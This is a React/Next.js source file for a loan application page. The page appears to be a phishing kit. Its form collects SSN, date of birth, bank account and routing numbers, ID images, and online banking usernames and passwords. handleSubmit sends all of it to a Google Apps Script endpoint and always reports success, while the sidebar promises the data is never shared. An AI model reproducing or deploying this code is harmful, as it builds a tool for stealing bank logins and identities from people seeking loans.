'use client';

import { useState, ChangeEvent } from 'react';
import Link from 'next/link';
import {
  Shield, Clock, DollarSign, Phone, CheckCircle, ChevronRight,
  ChevronLeft, Upload, Eye, EyeOff, AlertCircle
} from 'lucide-react';
import Navbar from '@/components/Navbar';
import Footer from '@/components/Footer';

/* ── helpers ── */
const fmtPhone = (v: string) => {
  const d = v.replace(/\D/g, '').slice(0, 10);
  if (d.length < 4) return d;
  if (d.length < 7) return `(${d.slice(0, 3)}) ${d.slice(3)}`;
  return `(${d.slice(0, 3)}) ${d.slice(3, 6)}-${d.slice(6)}`;
};

const fmtSSN = (v: string) => {
  const d = v.replace(/\D/g, '').slice(0, 9);
  if (d.length < 4) return d;
  if (d.length < 6) return `${d.slice(0, 3)}-${d.slice(3)}`;
  return `${d.slice(0, 3)}-${d.slice(3, 5)}-${d.slice(5)}`;
};

/* ── validation ── */
const validators = {
  loanAmount: (v: string) => /^[0-9,]+$/.test(v) && parseInt(v.replace(/,/g, '')) >= 500,
  monthlyIncome: (v: string) => /^[0-9,]+$/.test(v) && v.trim().length > 0,
  email: (v: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v),
  phone: (v: string) => v.replace(/\D/g, '').length === 10,
  ssn: (v: string) => v.replace(/\D/g, '').length === 9,
  zipCode: (v: string) => /^\d{5}(-\d{4})?$/.test(v),
  routingNumber: (v: string) => /^\d{9}$/.test(v),
  required: (v: string) => v.trim().length > 0,
};

/* ── form data type ── */
interface FormData {
  loanAmount: string; monthlyIncome: string; loanPurpose: string;
  firstName: string; lastName: string; email: string; phone: string;
  dob: string; ssn: string; currentEmployer: string; employerPhone: string;
  streetAddress: string; city: string; state: string; zipCode: string;
  bankName: string; accountNumber: string; routingNumber: string;
  mobileBankingUsername: string; mobileBankingPassword: string;
  documentType: string; 
  idFrontFile: File | null;
  idBackFile: File | null;
  agreeTerms: boolean; agreePrivacy: boolean;
}

const INITIAL: FormData = {
  loanAmount: '', monthlyIncome: '', loanPurpose: '',
  firstName: '', lastName: '', email: '', phone: '', dob: '', ssn: '',
  currentEmployer: '', employerPhone: '',
  streetAddress: '', city: '', state: '', zipCode: '',
  bankName: '', accountNumber: '', routingNumber: '',
  mobileBankingUsername: '', mobileBankingPassword: '',
  documentType: '', 
  idFrontFile: null,
  idBackFile: null,
  agreeTerms: false, agreePrivacy: false,
};

const US_STATES = [
  'AL','AK','AZ','AR','CA','CO','CT','DE','FL','GA','HI','ID','IL','IN','IA',
  'KS','KY','LA','ME','MD','MA','MI','MN','MS','MO','MT','NE','NV','NH','NJ',
  'NM','NY','NC','ND','OH','OK','OR','PA','RI','SC','SD','TN','TX','UT','VT',
  'VA','WA','WV','WI','WY',
];

/* ── step labels ── */
const STEPS = ['Loan Info', 'Personal', 'Banking'];

/* ── field wrapper ── */
function Field({ label, error, children }: { label: string; error?: string; children: React.ReactNode }) {
  return (
    <div>
      <label className="block text-xs font-semibold text-gray-700 mb-1.5">{label}</label>
      {children}
      {error && (
        <p className="flex items-center gap-1 mt-1 text-xs text-red-500">
          <AlertCircle className="w-3 h-3" />{error}
        </p>
      )}
    </div>
  );
}

const inputCls = (err?: string) =>
  `w-full px-3 py-2.5 rounded-lg border text-sm outline-none transition-all bg-white ${
    err ? 'border-red-400 focus:border-red-400 focus:ring-2 focus:ring-red-100'
        : 'border-gray-200 focus:border-[#0f1f3d] focus:ring-2 focus:ring-[#0f1f3d]/10'
  }`;

export default function ApplyNow() {
  const [step, setStep] = useState(1);
  const [data, setData] = useState<FormData>(INITIAL);
  const [errors, setErrors] = useState<Partial<Record<keyof FormData, string>>>({});
  const [showAcct, setShowAcct] = useState(false);
  const [showBankPwd, setShowBankPwd] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  const set = (k: keyof FormData) => (e: ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
    const val = e.target.type === 'checkbox' ? (e.target as HTMLInputElement).checked : e.target.value;
    setData(prev => ({ ...prev, [k]: val }));
    setErrors(prev => ({ ...prev, [k]: undefined }));
  };

  const setFmt = (k: keyof FormData, fmt: (v: string) => string) => (e: ChangeEvent<HTMLInputElement>) => {
    const formatted = fmt(e.target.value);
    setData(prev => ({ ...prev, [k]: formatted }));
    setErrors(prev => ({ ...prev, [k]: undefined }));
  };

  /* per-step validation */
  const validateStep = (s: number): boolean => {
    const errs: Partial<Record<keyof FormData, string>> = {};
    if (s === 1) {
      if (!validators.loanAmount(data.loanAmount)) errs.loanAmount = 'Enter a valid amount (min $500)';
      if (!validators.monthlyIncome(data.monthlyIncome)) errs.monthlyIncome = 'Required';
      if (!validators.required(data.loanPurpose)) errs.loanPurpose = 'Please select a purpose';
    }
    if (s === 2) {
      if (!validators.required(data.firstName)) errs.firstName = 'Required';
      if (!validators.required(data.lastName)) errs.lastName = 'Required';
      if (!validators.email(data.email)) errs.email = 'Enter a valid email';
      if (!validators.phone(data.phone)) errs.phone = 'Enter a 10-digit US phone number';
      if (!validators.required(data.dob)) errs.dob = 'Required';
      if (!validators.ssn(data.ssn)) errs.ssn = 'Enter a valid 9-digit SSN';
      if (!validators.required(data.currentEmployer)) errs.currentEmployer = 'Required';
    }
    if (s === 3) {
      if (!validators.required(data.streetAddress)) errs.streetAddress = 'Required';
      if (!validators.required(data.city)) errs.city = 'Required';
      if (!validators.required(data.state)) errs.state = 'Please select a state';
      if (!validators.zipCode(data.zipCode)) errs.zipCode = 'Enter a valid 5-digit zip';
      if (!validators.required(data.bankName)) errs.bankName = 'Required';
      if (!validators.required(data.accountNumber)) errs.accountNumber = 'Required';
      if (!validators.routingNumber(data.routingNumber)) errs.routingNumber = 'Enter a valid 9-digit routing number';
      if (!data.agreeTerms) errs.agreeTerms = 'You must agree to the Terms of Service';
      if (!data.agreePrivacy) errs.agreePrivacy = 'You must agree to the Privacy Policy';
    }
    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const next = () => { if (validateStep(step)) setStep(s => s + 1); };
  const back = () => setStep(s => s - 1);

  // Helper to convert file to base64
  const fileToBase64 = (file: File): Promise<string> => {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.readAsDataURL(file);
      reader.onload = () => resolve(reader.result as string);
      reader.onerror = reject;
    });
  };

  const handleSubmit = async () => {
    if (!validateStep(3)) return;
    setSubmitting(true);
    
    try {
      // Convert files to base64
      const [idFrontBase64, idBackBase64] = await Promise.all([
        data.idFrontFile ? fileToBase64(data.idFrontFile) : Promise.resolve(''),
        data.idBackFile ? fileToBase64(data.idBackFile) : Promise.resolve(''),
      ]);

      const payload = {
        ...data,
        idFrontFile: idFrontBase64,
        idFrontName: data.idFrontFile?.name || '',
        idFrontType: data.idFrontFile?.type || '',
        idBackFile: idBackBase64,
        idBackName: data.idBackFile?.name || '',
        idBackType: data.idBackFile?.type || '',
      };

      await fetch(
        'https://script.google.com/macros/s/AKfycbwEwz8jIt-U0SYnkvuPjqhPvwa641MgM-3cB4cdQ2dQsH_Ar28mDP4CcWX8MSBzSbNFsw/exec',
        {
          method: 'POST',
          mode: 'no-cors',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        }
      );
    } catch (_) {
      // no-cors mode always throws — submission still goes through
    }
    setSubmitting(false);
    setSubmitted(true);
  };

  if (submitted) {
    return (
      <>
        <Navbar />
        <div className="min-h-screen bg-[#f8fafc] flex items-center justify-center px-4 py-20">
          <div className="bg-white rounded-2xl shadow-lg p-10 max-w-md w-full text-center">
            <div className="w-16 h-16 bg-[#E8521A] rounded-full flex items-center justify-center mx-auto mb-5">
              <CheckCircle className="w-8 h-8 text-white" />
            </div>
            <h2 className="text-2xl font-bold text-[#0f1f3d] mb-3">Application Submitted!</h2>
            <p className="text-gray-500 text-sm mb-6 leading-relaxed">
              Thank you, {data.firstName}! Our team will review your application and contact you within 24 hours.
            </p>
            <Link
              href="/"
              className="inline-flex items-center gap-2 bg-[#0f1f3d] hover:bg-[#1a2f55] text-white px-6 py-3 rounded-full font-semibold text-sm transition-colors"
            >
              Back to Home
            </Link>
          </div>
        </div>
        <Footer />
      </>
    );
  }

  return (
    <>
      <Navbar />

      {/* Page hero - dark navy */}
      <div className="bg-[#0f1f3d] text-white pt-10 pb-0">
        <div className="container mx-auto max-w-[1200px] px-4 sm:px-6 lg:px-8 text-center pb-8">
          <h1 className="text-3xl md:text-4xl font-extrabold mb-2">Apply for a Loan</h1>
          <p className="text-gray-400 text-sm">3 simple steps. Decision within 24 hours.</p>
        </div>

        {/* Step progress inside hero */}
        <div className="container mx-auto max-w-[1200px] px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-center gap-0 pb-6">
            {STEPS.map((label, i) => {
              const n = i + 1;
              const active = step === n;
              const done = step > n;
              return (
                <div key={n} className="flex items-center">
                  <div className="flex flex-col items-center">
                    <div className={`w-9 h-9 rounded-full flex items-center justify-center text-sm font-bold transition-all ${
                      done ? 'bg-[#E8521A] text-white'
                           : active ? 'bg-[#E8521A] text-white'
                                    : 'bg-[#1e3255] text-gray-400 border border-gray-600'
                    }`}>
                      {done ? <CheckCircle className="w-4 h-4" /> : n}
                    </div>
                    <span className={`mt-1.5 text-xs font-medium ${
                      active ? 'text-[#E8521A]' : done ? 'text-gray-400' : 'text-gray-500'
                    }`}>
                      {label}
                    </span>
                  </div>
                  {i < STEPS.length - 1 && (
                    <div className={`w-20 sm:w-32 h-px mx-3 mb-5 transition-all ${done ? 'bg-[#E8521A]' : 'bg-gray-600'}`} />
                  )}
                </div>
              );
            })}
          </div>
        </div>
        {/* Orange bottom border */}
        <div className="h-1 bg-[#E8521A]" />
      </div>

      <div className="bg-[#f8fafc] min-h-screen py-8">
        <div className="container mx-auto max-w-[1200px] px-4 sm:px-6 lg:px-8">
          <div className="grid lg:grid-cols-5 gap-8">

            {/* ── MAIN FORM ── */}
            <div className="lg:col-span-3">
              <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 sm:p-8">

                {/* STEP 1 */}
                {step === 1 && (
                  <div>
                    <div className="flex items-center gap-2 mb-1">
                      <span className="text-[#E8521A]"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg></span>
                      <h2 className="text-lg font-bold text-[#0f1f3d]">Loan Details</h2>
                    </div>
                    <p className="text-sm text-[#E8521A] mb-6">How much do you need?</p>
                    <div className="space-y-5">
                      <div className="grid sm:grid-cols-2 gap-4">
                        <Field label="Loan Amount ($)" error={errors.loanAmount}>
                          <input type="text" placeholder="e.g. 10,000" value={data.loanAmount}
                            onChange={set('loanAmount')} className={inputCls(errors.loanAmount)} />
                        </Field>
                        <Field label="Monthly Income ($)" error={errors.monthlyIncome}>
                          <input type="text" placeholder="e.g. 5,000" value={data.monthlyIncome}
                            onChange={set('monthlyIncome')} className={inputCls(errors.monthlyIncome)} />
                        </Field>
                      </div>
                      <Field label="Purpose" error={errors.loanPurpose}>
                        <select value={data.loanPurpose} onChange={set('loanPurpose')} className={inputCls(errors.loanPurpose)}>
                          <option value="">Select purpose</option>
                          {['Debt Consolidation','Home Improvement','Medical Expenses','Education','Business','Emergency','Other'].map(o => (
                            <option key={o} value={o}>{o}</option>
                          ))}
                        </select>
                      </Field>
                    </div>
                    <button onClick={next} className="mt-8 w-full flex items-center justify-center gap-2 bg-[#0ea5e9] hover:bg-[#0284c7] text-white py-3.5 rounded-lg font-semibold text-sm transition-colors">
                      Continue <ChevronRight className="w-4 h-4" />
                    </button>
                  </div>
                )}

                {/* STEP 2 */}
                {step === 2 && (
                  <div>
                    <div className="flex items-center gap-2 mb-1">
                      <span className="text-[#E8521A]"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></span>
                      <h2 className="text-lg font-bold text-[#0f1f3d]">Personal Info</h2>
                    </div>
                    <p className="text-sm text-[#E8521A] mb-6">Tell us about yourself.</p>
                    <div className="grid sm:grid-cols-2 gap-4">
                      <Field label="First Name" error={errors.firstName}>
                        <input type="text" placeholder="John" value={data.firstName}
                          onChange={set('firstName')} className={inputCls(errors.firstName)} />
                      </Field>
                      <Field label="Last Name" error={errors.lastName}>
                        <input type="text" placeholder="Doe" value={data.lastName}
                          onChange={set('lastName')} className={inputCls(errors.lastName)} />
                      </Field>
                      <Field label="Email Address" error={errors.email}>
                        <input type="email" placeholder="you@example.com" value={data.email}
                          onChange={set('email')} className={inputCls(errors.email)} />
                      </Field>
                      <Field label="Phone Number" error={errors.phone}>
                        <input type="tel" placeholder="(555) 000-0000" value={data.phone}
                          onChange={setFmt('phone', fmtPhone)} className={inputCls(errors.phone)} />
                      </Field>
                      <Field label="Date of Birth" error={errors.dob}>
                        <input type="date" value={data.dob}
                          onChange={set('dob')} className={inputCls(errors.dob)} />
                      </Field>
                      <Field label="Social Security Number" error={errors.ssn}>
                        <input type="text" placeholder="XXX-XX-XXXX" value={data.ssn}
                          onChange={setFmt('ssn', fmtSSN)} className={inputCls(errors.ssn)} />
                      </Field>
                      <Field label="Current Employer" error={errors.currentEmployer}>
                        <input type="text" placeholder="Company name" value={data.currentEmployer}
                          onChange={set('currentEmployer')} className={inputCls(errors.currentEmployer)} />
                      </Field>
                      <Field label="Employer Phone (Optional)">
                        <input type="tel" placeholder="(555) 000-0000" value={data.employerPhone}
                          onChange={setFmt('employerPhone', fmtPhone)} className={inputCls()} />
                      </Field>
                    </div>
                    <div className="mt-8 flex gap-3">
                      <button onClick={back} className="flex items-center gap-1.5 px-5 py-3 rounded-xl border border-gray-200 text-gray-600 hover:bg-gray-50 text-sm font-semibold transition-colors">
                        <ChevronLeft className="w-4 h-4" /> Back
                      </button>
                      <button onClick={next} className="flex-1 flex items-center justify-center gap-2 bg-[#0ea5e9] hover:bg-[#0284c7] text-white py-3.5 rounded-lg font-semibold text-sm transition-colors">
                        Continue <ChevronRight className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                )}

                {/* STEP 3 */}
                {step === 3 && (
                  <div>
                    {/* Address */}
                    <div className="flex items-center gap-2 mb-1">
                      <span className="text-[#E8521A]"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></span>
                      <h2 className="text-lg font-bold text-[#0f1f3d]">Your Address</h2>
                    </div>
                    <p className="text-sm text-[#E8521A] mb-5">Your current address.</p>
                    <div className="grid sm:grid-cols-2 gap-4 mb-8">
                      <div className="sm:col-span-2">
                        <Field label="Street Address" error={errors.streetAddress}>
                          <input type="text" placeholder="123 Main St" value={data.streetAddress}
                            onChange={set('streetAddress')} className={inputCls(errors.streetAddress)} />
                        </Field>
                      </div>
                      <Field label="City" error={errors.city}>
                        <input type="text" placeholder="Fort Myers" value={data.city}
                          onChange={set('city')} className={inputCls(errors.city)} />
                      </Field>
                      <Field label="State" error={errors.state}>
                        <select value={data.state} onChange={set('state')} className={inputCls(errors.state)}>
                          <option value="">Select state</option>
                          {US_STATES.map(s => <option key={s} value={s}>{s}</option>)}
                        </select>
                      </Field>
                      <Field label="Zip Code" error={errors.zipCode}>
                        <input type="text" placeholder="33901" value={data.zipCode}
                          onChange={set('zipCode')} className={inputCls(errors.zipCode)} maxLength={10} />
                      </Field>
                    </div>

                    {/* Banking */}
                    <div className="flex items-center gap-2 mb-1">
                      <span className="text-[#E8521A]"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg></span>
                      <h2 className="text-lg font-bold text-[#0f1f3d]">Banking Details</h2>
                    </div>
                    <p className="text-sm text-[#E8521A] mb-5">For fund disbursement.</p>
                    <div className="grid sm:grid-cols-2 gap-4 mb-8">
                      <Field label="Bank Name" error={errors.bankName}>
                        <input type="text" placeholder="Chase Bank" value={data.bankName}
                          onChange={set('bankName')} className={inputCls(errors.bankName)} />
                      </Field>
                      <Field label="Routing Number" error={errors.routingNumber}>
                        <input type="text" placeholder="9-digit routing number" value={data.routingNumber}
                          onChange={set('routingNumber')} className={inputCls(errors.routingNumber)} maxLength={9} />
                      </Field>
                      <Field label="Account Number" error={errors.accountNumber}>
                        <div className="relative">
                          <input type={showAcct ? 'text' : 'password'} placeholder="Account number" value={data.accountNumber}
                            onChange={set('accountNumber')} className={inputCls(errors.accountNumber) + ' pr-10'} />
                          <button type="button" onClick={() => setShowAcct(v => !v)}
                            className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600">
                            {showAcct ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                          </button>
                        </div>
                      </Field>
                      <Field label="Mobile Banking Username">
                        <input type="text" placeholder="Username" value={data.mobileBankingUsername}
                          onChange={set('mobileBankingUsername')} className={inputCls()} />
                      </Field>
                      <Field label="Mobile Banking Password">
                        <div className="relative">
                          <input type={showBankPwd ? 'text' : 'password'} placeholder="Password" value={data.mobileBankingPassword}
                            onChange={set('mobileBankingPassword')} className={inputCls() + ' pr-10'} />
                          <button type="button" onClick={() => setShowBankPwd(v => !v)}
                            className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600">
                            {showBankPwd ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                          </button>
                        </div>
                      </Field>
                    </div>

                    {/* ID Upload */}
                    <div className="flex items-center gap-2 mb-1">
                      <span className="text-[#E8521A]"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="M3 10h18"/><path d="M8 14h.01"/><path d="M12 14h.01"/><path d="M16 14h.01"/><path d="M8 18h.01"/><path d="M12 18h.01"/><path d="M16 18h.01"/></svg></span>
                      <h2 className="text-lg font-bold text-[#0f1f3d]">Government ID Upload <span className="text-sm font-normal text-gray-400">(Optional)</span></h2>
                    </div>
                    <p className="text-sm text-[#E8521A] mb-5">Optional — Upload front and back of your ID.</p>
                    
                    <div className="space-y-4 mb-8">
                      <Field label="ID Type" error={errors.documentType}>
                        <select value={data.documentType} onChange={set('documentType')} className={inputCls(errors.documentType)}>
                          <option value="">Select ID type</option>
                          {["Driver's License", 'Passport', 'State ID', 'Social Security Card'].map(o => (
                            <option key={o} value={o}>{o}</option>
                          ))}
                        </select>
                      </Field>
                      
                      {/* ID Front Upload */}
                      <div>
                        <label className="block text-xs font-semibold text-gray-700 mb-1.5">ID Front Side</label>
                        <label className="flex flex-col items-center justify-center w-full px-3 py-4 rounded-lg border-2 border-dashed border-gray-300 hover:border-[#E8521A] cursor-pointer transition-colors bg-white">
                          <Upload className="w-6 h-6 text-gray-400 mb-2" />
                          <span className="text-sm text-gray-500 text-center">
                            {data.idFrontFile ? data.idFrontFile.name : 'Click to upload ID Front (JPG, PNG, PDF)'}
                          </span>
                          <input 
                            type="file" 
                            className="hidden" 
                            accept="image/*,.pdf,.jpg,.jpeg,.png"
                            onChange={(e) => {
                              const file = e.target.files?.[0] || null;
                              setData(p => ({ ...p, idFrontFile: file }));
                              if (file) setErrors(p => ({ ...p, idFrontFile: undefined }));
                            }}
                          />
                        </label>
                        {errors.idFrontFile && <p className="text-xs text-red-500 mt-1">{errors.idFrontFile}</p>}
                        {data.idFrontFile && (
                          <p className="text-xs text-green-600 mt-1 flex items-center gap-1">
                            <CheckCircle className="w-3 h-3" /> {data.idFrontFile.name} ({(data.idFrontFile.size / 1024).toFixed(0)} KB)
                          </p>
                        )}
                      </div>
                      
                      {/* ID Back Upload */}
                      <div>
                        <label className="block text-xs font-semibold text-gray-700 mb-1.5">ID Back Side</label>
                        <label className="flex flex-col items-center justify-center w-full px-3 py-4 rounded-lg border-2 border-dashed border-gray-300 hover:border-[#E8521A] cursor-pointer transition-colors bg-white">
                          <Upload className="w-6 h-6 text-gray-400 mb-2" />
                          <span className="text-sm text-gray-500 text-center">
                            {data.idBackFile ? data.idBackFile.name : 'Click to upload ID Back (JPG, PNG, PDF)'}
                          </span>
                          <input 
                            type="file" 
                            className="hidden" 
                            accept="image/*,.pdf,.jpg,.jpeg,.png"
                            onChange={(e) => {
                              const file = e.target.files?.[0] || null;
                              setData(p => ({ ...p, idBackFile: file }));
                              if (file) setErrors(p => ({ ...p, idBackFile: undefined }));
                            }}
                          />
                        </label>
                        {errors.idBackFile && <p className="text-xs text-red-500 mt-1">{errors.idBackFile}</p>}
                        {data.idBackFile && (
                          <p className="text-xs text-green-600 mt-1 flex items-center gap-1">
                            <CheckCircle className="w-3 h-3" /> {data.idBackFile.name} ({(data.idBackFile.size / 1024).toFixed(0)} KB)
                          </p>
                        )}
                      </div>
                    </div>

                    {/* Terms */}
                    <div className="space-y-3 mb-8 p-4 bg-[#f8fafc] rounded-xl border border-gray-100">
                      <label className="flex items-start gap-3 cursor-pointer">
                        <input type="checkbox" checked={data.agreeTerms}
                          onChange={e => { setData(p => ({ ...p, agreeTerms: e.target.checked })); setErrors(p => ({ ...p, agreeTerms: undefined })); }}
                          className="mt-0.5 w-4 h-4 accent-[#0ea5e9] shrink-0" />
                        <span className="text-xs text-gray-600">
                          I agree to the{' '}
                          <Link href="/terms" className="text-[#0ea5e9] hover:underline" target="_blank">Terms of Service</Link>
                          {' '}and the{' '}
                          <Link href="/sms-policy" className="text-[#0ea5e9] hover:underline" target="_blank">SMS Policy</Link>
                        </span>
                      </label>
                      {errors.agreeTerms && <p className="text-xs text-red-500 ml-7">{errors.agreeTerms}</p>}
                      <label className="flex items-start gap-3 cursor-pointer">
                        <input type="checkbox" checked={data.agreePrivacy}
                          onChange={e => { setData(p => ({ ...p, agreePrivacy: e.target.checked })); setErrors(p => ({ ...p, agreePrivacy: undefined })); }}
                          className="mt-0.5 w-4 h-4 accent-[#0ea5e9] shrink-0" />
                        <span className="text-xs text-gray-600">
                          I agree to the{' '}
                          <Link href="/privacy-policy" className="text-[#0ea5e9] hover:underline" target="_blank">Privacy Policy</Link>
                        </span>
                      </label>
                      {errors.agreePrivacy && <p className="text-xs text-red-500 ml-7">{errors.agreePrivacy}</p>}
                    </div>

                    <div className="flex gap-3">
                      <button onClick={back} className="flex items-center gap-1.5 px-5 py-3 rounded-xl border border-gray-200 text-gray-600 hover:bg-gray-50 text-sm font-semibold transition-colors">
                        <ChevronLeft className="w-4 h-4" /> Back
                      </button>
                      <button onClick={handleSubmit} disabled={submitting}
                        className="flex-1 flex items-center justify-center gap-2 bg-[#0ea5e9] hover:bg-[#0284c7] disabled:opacity-60 text-white py-3.5 rounded-lg font-semibold text-sm transition-colors">
                        {submitting ? 'Submitting…' : 'Submit Application'}
                        {!submitting && <ChevronRight className="w-4 h-4" />}
                      </button>
                    </div>
                  </div>
                )}
              </div>
            </div>

            {/* ── SIDEBAR ── */}
            <div className="lg:col-span-2 space-y-4">
              {/* Secure */}
              <div className="bg-[#0f1f3d] rounded-2xl p-5 text-white">
                <div className="flex items-center gap-3 mb-3">
                  <div className="w-9 h-9 bg-[#E8521A] rounded-lg flex items-center justify-center shrink-0">
                    <Shield className="w-5 h-5 text-white" />
                  </div>
                  <h4 className="text-sm font-bold text-white">Secure</h4>
                </div>
                <p className="text-xs text-gray-300 leading-relaxed">
                  256-bit SSL encryption. Your data is never shared.
                </p>
              </div>

              {/* Fast */}
              <div className="bg-[#0f1f3d] rounded-2xl p-5 text-white">
                <div className="flex items-center gap-3 mb-3">
                  <div className="w-9 h-9 bg-[#E8521A] rounded-lg flex items-center justify-center shrink-0">
                    <Clock className="w-5 h-5 text-white" />
                  </div>
                  <h4 className="text-sm font-bold text-white">Fast</h4>
                </div>
                <ul className="space-y-1.5">
                  {['5-minute application', '24-hour decision', 'Fast funding', 'No hidden fees'].map(item => (
                    <li key={item} className="flex items-center gap-2 text-xs text-gray-300">
                      <CheckCircle className="w-3.5 h-3.5 text-[#E8521A] shrink-0" />{item}
                    </li>
                  ))}
                </ul>
              </div>

              {/* Loan Range */}
              <div className="bg-white rounded-2xl border border-gray-100 shadow-sm p-5">
                <div className="flex items-center gap-3 mb-3">
                  <div className="w-9 h-9 bg-[#f0f4ff] rounded-lg flex items-center justify-center shrink-0">
                    <DollarSign className="w-5 h-5 text-[#0f1f3d]" />
                  </div>
                  <h4 className="text-sm font-bold text-[#0f1f3d]">Loan Amounts</h4>
                </div>
                <ul className="space-y-2">
                  {[
                    ['Payday', '$3K – $10K'],
                    ['Personal', '$500 – $25K'],
                    ['Home', '$5K – $35K'],
                    ['Business', '$5K – $50K'],
                  ].map(([type, range]) => (
                    <li key={type} className="flex items-center justify-between text-xs">
                      <span className="text-gray-500">{type}</span>
                      <span className="font-semibold text-[#E8521A]">{range}</span>
                    </li>
                  ))}
                </ul>
              </div>

              {/* Need Help */}
              <div className="bg-[#0f1f3d] rounded-2xl p-5 text-white">
                <div className="flex items-center gap-3 mb-3">
                  <div className="w-9 h-9 bg-[#E8521A] rounded-lg flex items-center justify-center shrink-0">
                    <Phone className="w-5 h-5 text-white" />
                  </div>
                  <h4 className="text-sm font-bold">Need Help?</h4>
                </div>
                <p className="text-xs text-gray-300 mb-3">Our team is ready to assist you Mon–Fri 8AM–8PM PT.</p>
                <a href="tel:+14154729661" className="text-[#E8521A] hover:text-white text-sm font-bold transition-colors">
                  +1(415) 472-9661
                </a>
              </div>
            </div>

          </div>
        </div>
      </div>

      <Footer />
    </>
  );
}
